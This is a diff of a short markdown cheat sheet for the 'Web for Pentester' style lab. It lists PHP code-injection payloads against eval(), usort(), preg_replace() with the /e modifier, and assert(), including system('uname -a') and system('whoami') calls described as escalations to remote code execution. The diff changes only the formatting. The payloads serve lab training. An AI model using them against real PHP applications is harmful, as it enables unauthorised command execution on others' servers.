@@ -3,24 +3,24 @@ Code Injection is the general term for attack types which consist of injecting c
 
 ### Web for Penterster
 ### example 1
-` eval() - evaluates a string as PHP code `
+` eval() - evaluates a string as PHP code ` <br>
 **payload**- " .phpinfo(). "  <br>
 **payload**- " . hacker".system('uname -a');#       - change to RCE  & url encode need 
 
 
 ### example 2
-> usort() - Sort an array by values using a user-defined comparison function<br>
+` usort() - Sort an array by values using a user-defined comparison function ` <br>
 **payload**-example2.php?order=id,system('whoami') <br>
 **payload**- example2.php?order=id);}system('whoami');#      - change to RCE  & url encode need 
 
 
 ### example 3
-> preg_replace() — Perform a regular expression search and replace <br>
+` preg_replace() — Perform a regular expression search and replace `<br>
 **payload** - example3.php?new=phpinfo()&pattern=/lamer/e&base=Hello lamer"  <br>
 **payload** - example3.php?new=system('uname -a')&pattern=/lamer/e&base=Hello lamer         - change to RCE
 
 
 ### example 4
-> assert() - Checks if assertion is FALSE <br>
+` assert() - Checks if assertion is FALSE `
 **payload** - example4.php?name=hacker'.phpinfo().' <br>
 **payload** - example4.php?name=hacker'.system('uname -a').'
